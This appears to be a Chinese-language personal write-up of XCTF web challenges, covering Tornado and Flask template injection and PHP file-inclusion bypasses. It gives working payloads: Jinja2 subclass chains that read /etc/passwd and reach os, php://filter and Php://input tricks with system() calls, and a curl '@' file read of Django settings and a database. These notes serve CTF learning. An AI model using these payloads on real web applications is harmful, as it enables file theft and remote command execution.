---
title: xctf刷题
date: 2023.4.15
updated: 2023.5.10
categories: 网络安全 
tags: ctf
description: xctf刷题记录
---
# **模板注入**
## Tornado 框架
### 知识点：
* render函数：通过传递不同的参数形成不同的改变
* tornado render模板注入漏洞：
```
tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。
```
### 得到cookie_secret的值：
```
error?msg={{handler.settings}}
```
*handler.settings是tornado框架的一个附属文件*
## flassk模板注入
### 思路：
找到父类<type 'object'>-->寻找子类-->找关于命令执行或者文件操作的模块。
* 几个魔术方法：
```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的
__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
## {{}}:
* 传递变量
* 执行一些简单表达式
```
---
* {{config}}：查看全局变量
### 步骤：
1. 寻找可用引用
```
{{''.__class__.__mro__[2].__subclasses__()}}
```
2. 文件读取，`[40]`是tupe file类型出现位置（从0开始的位置）
```
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}
```
3. 命令执行(有一个 <class ‘site._Printer’>类型)
```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```
* `[71]`为<class ‘site._Printer’>出现位置 
#  2.文件include
* *5.10更新：好久没刷题了，做个md复习一下*
### file_include(过滤)
```php
<?php
highlight_file(__FILE__);
    include("./check.php"); 
    if(isset($_GET['filename'])){
        $filename  = $_GET['filename'];
        include($filename);
    }
?>
```
* 尝试用php://filter:
>?filename=php://filter/read=convert.base64-encode/reasource=check.php
回显"do not hack!"
那应该是过滤
* 使用过滤器 convert.* (string.*被过滤)
* 构造URL：
>?filename=php://filter/convert.iconv.a.b/resource=flag.php
`flag可能在flag.php`
* 使用bp对a,b进行爆破(集束炸弹)，字典如下：
```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
```
## web_php_include
```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);//过滤了php://
}
include($page);
?>
```
### 知识点
* 由题可知过滤了php://,考虑使用其它伪协议
* 伪协议包括：
**file协议**：
allow_url_fopen ：off/on
allow_url_include：off/on

file:// `用于访问本地文件系统`，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。

**php://协议**:
仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。

**data://协议**：满足双off条件

* **strstr**函数：
函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。
* **str_replace()**函数：
>以其他字符替换字符串中的一些字符（区分大小写）。
例如：把字符串 "Hello world!" 中的字符 "world" 替换为 "Shanghai"：
```php
<?php
echo str_replace("world","Shanghai","Hello world!");
?>
```
本题意思为当传给page的参数有php：//时替换为空
### 解题步骤
1. 使用php：//input
> 构造URL：?page=Php://input //大写绕过
使用bp传入：
a=<?php system('ls');?>a
* playload:
```
a = <?php system('cat fl4gisisish3r3.php');?>
```
# cat
* 并不是命令注入
* 看wp得知
> 未过滤字符在url栏上会被进行url编码
在url栏测试宽字符，即ascii码超过127的url编码即可，也就是%81-%ef
发现任意一个宽字符，都会出现报错信息
*这道题有关一个djiango特性和php特性，没看懂。*
* 解题步骤：
playload1：?url=%80,发现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。
**php特性**：
WP得知php的curl组件请求加上@会读取文件，读取settings.py文件获取数据库名称
* 构造playload2：
?url=@/opt/api/api/settings.py *读取配置文件*
Ctrl+f搜索database
* 构造playload3：
?url=@/opt/api/database.sqlite3
`搜索flag/ctf可得flag`
`最后的flag竟然不包含前面的A`



